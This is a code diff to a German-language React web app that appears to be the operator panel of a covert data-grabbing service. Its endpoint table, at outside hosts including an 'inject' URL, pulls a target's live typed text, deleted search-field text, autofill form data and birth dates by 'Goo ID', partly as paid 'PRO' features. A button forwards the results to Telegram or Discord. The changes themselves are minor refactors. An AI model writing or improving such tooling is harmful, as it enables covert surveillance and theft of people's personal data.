@@ -4,14 +4,27 @@ const BASE_GOO = "https://11q.co";
 const BASE_INJECT = "https://11z.co/_w";
 const BASE_UNIFI = "https://thump.buzz/unifi/getEvent";
 
+function epPath(ep, id) {
+  switch(ep) {
+    case "get-last":            return `/api/last/${id}`;
+    case "post-thump":          return `/api/thump/${id}`;
+    case "pro-last-deleted":    return `/pro-api/${id}/last-deleted`;
+    case "pro-autofill":        return `/pro-api/${id}/autofill`;
+    case "live-text":           return `/api/live-text/${id}`;
+    case "pro-last-bd":         return `/pro-api/${id}/last-bd`;
+    case "pro-last-deleted-bd": return `/pro-api/${id}/last-deleted-bd`;
+    default: return "/";
+  }
+}
+
 const ENDPOINTS = {
-  "get-last":            { method: "GET",  path: id => `/api/last/${id}`,                desc: "Ruft die zuletzt gesendete Suchanfrage für die Goo ID ab.", query: false },
-  "post-thump":          { method: "POST", path: id => `/api/thump/${id}`,               desc: "Sendet eine Suchanfrage (query) für die angegebene Goo ID.", query: true },
-  "pro-last-deleted":    { method: "GET",  path: id => `/pro-api/${id}/last-deleted`,    desc: "⭐ PRO — Ruft den zuletzt gelöschten Text aus dem Suchfeld ab.", query: false },
-  "pro-autofill":        { method: "GET",  path: id => `/pro-api/${id}/autofill`,        desc: "⭐ PRO — Ruft per Autofill übermittelte Formulardaten ab.", query: false },
-  "live-text":           { method: "GET",  path: id => `/api/live-text/${id}`,           desc: "⭐ PRO — Gibt den aktuell getippten Text in Echtzeit zurück.", query: false, live: true },
-  "pro-last-bd":         { method: "GET",  path: id => `/pro-api/${id}/last-bd`,         desc: "⭐ PRO — Ruft das Geburtsdatum zur letzten Suchanfrage ab.", query: false },
-  "pro-last-deleted-bd": { method: "GET",  path: id => `/pro-api/${id}/last-deleted-bd`, desc: "⭐ PRO — Wie last-bd, aber basierend auf dem zuletzt gelöschten Text.", query: false },
+  "get-last":            { method: "GET",  desc: "Ruft die zuletzt gesendete Suchanfrage f\u00fcr die Goo ID ab.", query: false },
+  "post-thump":          { method: "POST", desc: "Sendet eine Suchanfrage (query) f\u00fcr die angegebene Goo ID.", query: true },
+  "pro-last-deleted":    { method: "GET",  desc: "\u2b50 PRO \u2014 Ruft den zuletzt gel\u00f6schten Text aus dem Suchfeld ab.", query: false },
+  "pro-autofill":        { method: "GET",  desc: "\u2b50 PRO \u2014 Ruft per Autofill \u00fcbermittelte Formulardaten ab.", query: false },
+  "live-text":           { method: "GET",  desc: "\u2b50 PRO \u2014 Gibt den aktuell getippten Text in Echtzeit zur\u00fcck.", query: false, live: true },
+  "pro-last-bd":         { method: "GET",  desc: "\u2b50 PRO \u2014 Ruft das Geburtsdatum zur letzten Suchanfrage ab.", query: false },
+  "pro-last-deleted-bd": { method: "GET",  desc: "\u2b50 PRO \u2014 Wie last-bd, aber basierend auf dem zuletzt gel\u00f6schten Text.", query: false },
 };
 
 const UNIFI_COLORS = {
@@ -147,7 +160,7 @@ function GooSection({ onResult }) {
   const [query, setQuery] = useState("");
   const [loading, setLoading] = useState(false);
   const epObj = ENDPOINTS[ep];
-  const url = BASE_GOO + epObj.path(gooId || "{goo_id}");
+  const url = BASE_GOO + epPath(ep, gooId || "{goo_id}");
 
   async function send() {
     if (!gooId) { alert("Bitte eine Goo ID eingeben."); return; }
@@ -156,7 +169,7 @@ function GooSection({ onResult }) {
       const res = await fetch("/api/proxy", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ targetUrl: url, method: epObj.method, headers: { "Content-Type": "application/json" }, body: epObj.query ? JSON.stringify({ query }) : null })
+        body: JSON.stringify({ targetUrl: BASE_GOO + epPath(ep, gooId), method: epObj.method, headers: { "Content-Type": "application/json" }, body: epObj.query ? JSON.stringify({ query }) : null })
       });
       const data = await res.json();
       let formatted = data.body;
@@ -592,7 +605,7 @@ export default function App() {
           {activeTab !== "unifi" && (
             <>
               <ResponseBox result={result} />
-              <button onClick={() => setShareModal(result.body)} style={{ marginTop: 12, width: "100%", padding: "10px", background: "#1a1a2e", color: "#fff", border: "none", borderRadius: 8, fontSize: "0.92rem", fontWeight: 700, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
+              <button onClick={() => setShareModal(result ? result.body : "")} style={{ marginTop: 12, width: "100%", padding: "10px", background: "#1a1a2e", color: "#fff", border: "none", borderRadius: 8, fontSize: "0.92rem", fontWeight: 700, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
                 📤 An Telegram / Discord senden
               </button>
             </>
